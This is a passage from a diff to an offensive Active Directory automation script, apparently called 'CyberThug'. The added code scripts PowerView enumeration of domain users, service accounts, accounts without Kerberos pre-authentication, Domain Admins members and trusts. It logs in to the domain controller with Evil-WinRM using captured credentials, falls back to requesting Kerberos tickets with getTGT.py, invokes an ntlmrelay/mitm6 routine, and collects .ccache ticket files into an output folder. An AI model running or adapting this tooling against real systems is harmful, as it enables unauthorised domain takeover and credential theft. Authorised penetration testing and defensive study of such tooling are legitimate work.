+expect -re {PV.*❯};
+send -s \\\\\\\"Get-DomainUser\\\\\\\\r\\\\\\\";
+expect -re {PV.*❯};
+send -s \\\\\\\"Get-DomainUser -Properties Samaccountname,memberof,description\\\\\\\\r\\\\\\\";
+expect -re {PV.*❯};
+send -s \\\\\\\"Get-DomainUser -spn\\\\\\\\r\\\\\\\";
+expect -re {PV.*❯};
+send -s \\\\\\\"Get-DomainUser -spn -Properties servicePrincipalName\\\\\\\\r\\\\\\\";
+expect -re {PV.*❯};
+send -s \\\\\\\"Get-DomainUser -PreAuthNotRequired\\\\\\\\r\\\\\\\";
+expect -re {PV.*❯};
+send -s \\\\\\\"Get-DomainUser -Admincount -Properties Samaccountname,memberof,description\\\\\\\\r\\\\\\\";
+expect -re {PV.*❯};
+send -s \\\\\\\"Get-DomainComputer -Properties name,operatingSystem,samaccountname\\\\\\\\r\\\\\\\";
+expect -re {PV.*❯};
+send -s \\\\\\\"Get-DomainGroup\\\\\\\\r\\\\\\\";
+expect -re {PV.*❯};
+send -s \\\\\\\"Get-DomainGroup -Properties name,member\\\\\\\\r\\\\\\\";
+expect -re {PV.*❯};
+send -s \\\\\\\"Get-DomainGroup -Identity \\\\\\\\\\\\\\\"Domain Admins\\\\\\\\\\\\\\\"\\\\\\\\r\\\\\\\";
+expect -re {PV.*❯};
+send -s \\\\\\\"Get-DomainGroupMember -Identity \\\\\\\\\\\\\\\"Domain Admins\\\\\\\\\\\\\\\"\\\\\\\\r\\\\\\\";
+expect -re {PV.*❯};
+send -s \\\\\\\"Get-DomainGroup -AdminCount\\\\\\\\r\\\\\\\";
+expect -re {PV.*❯};
+send -s \\\\\\\"Get-DomainTrust\\\\\\\\r\\\\\\\";
+interact\\\"
+echo ''
+echo -e \\\"\\\e[1;33m[!] powerview failed for $user again with ticket\e[0m\\\"
+exec bash\"  
+gnome-terminal -- bash -c \"
+echo -e \\\"\\\e[1;32m[+] User: $user\e[0m\\\"
+echo -e \\\"\\\e[1;32m[+] Password: $p\e[0m\\\"
+echo -e \\\"\\\e[1;32m[+] DC: $DC\e[0m\\\"
+echo -e \\\"\\\e[1;32m[+] Domain: $CLEAN_DOMAIN\e[0m\\\"
+echo -e \\\"\\\e[1;32m[+] Ip: $Ip\e[0m\\\"
+
+echo -e \\\"\\\e[1;32m[+] Trying Evil-WinRM direct auth for $user ...\e[0m\\\"
+echo '' 
+echo -e \\\"\\\e[1;34m[+]-- Running evil-winrm -i $DC -u $user -p $p --[+]\e[0m\\\"
+echo ''
+evil-winrm -i $DC -u $user -p $p
+
+if [ \$? -ne 1 ]; then
+    echo ''
+    echo -e \\\"\\\e[1;33m[!] Evil-WinRM failed for $user. Trying getTGT.py and Kerberos auth ..\e[0m\\\"
+    echo ''
+
+    getTGT.py $CLEAN_DOMAIN/$user:$p -dc-ip $Ip -k
+    echo ''
+
+    if [ -f $user.ccache ]; then
+        export KRB5CCNAME=$user.ccache
+        echo ''
+        echo -e \\\"\\\e[1;34m[+]-- Running evil-winrm -i $DC -u $user -r $CLEAN_DOMAIN --[+]\e[0m\\\"
+        echo ''   
+        evil-winrm -i $DC -u $user -r $CLEAN_DOMAIN
+        if [ \$? -ne 0 ]; then
+            echo ''
+            echo -e \\\"\\\e[1;33m[!] Evil-WinRM failed for \$user again with ticket .. maybe user not in Remote Management Group\e[0m\\\"
+            echo ''
+        fi
+    else
+        echo -e \\\"\\\e[1;31m[-] getTGT.py failed. No ccache found for $user.\e[0m\\\"
+        echo ''
+    fi
+fi
+exec bash\"
+
+exec bash
+"
+        done
+    fi
+    sleep 5
+done
+    echo ""
+fi  
+exec bash
+'
+}
+ntlmrelay_mitm6
+    echo ""
     cat << EOF > /tmp/auto.sh
 #!/bin/bash
 trap '' SIGINT
@@ -6199,6 +6920,10 @@ EOF
             sed -i "s|__\\\$Kerberos__|$Kerberos|g" /tmp/auto.sh
             gnome-terminal -- bash -c "bash /tmp/auto.sh ; exec bash"
 fi 
+mkdir -p $HOME/CyberThug_output/tickets
+cp $HOME/*.ccache $HOME/CyberThug_output/tickets 2>/dev/null
+cp $HOME/Downloads/*.ccache $HOME/CyberThug_output/tickets 2>/dev/null
+cp *.ccache $HOME/CyberThug_output/tickets 2>/dev/null
 main
 echo ""
 rm $HOME/Downloads/tools/Files/*.state 2>/dev/null ; rm -r $HOME/Downloads/tools/Files/reports 2>/dev/null 
@@ -6238,4 +6963,4 @@ echo -e "\e[1;32m------------------[+] Finished [+]---------------------\e[0m"
 #--------------------------------------
 #    elif [[ "$tool" == "exit" ]]; then
                                                                            
-                                                                                      
+                                                                               
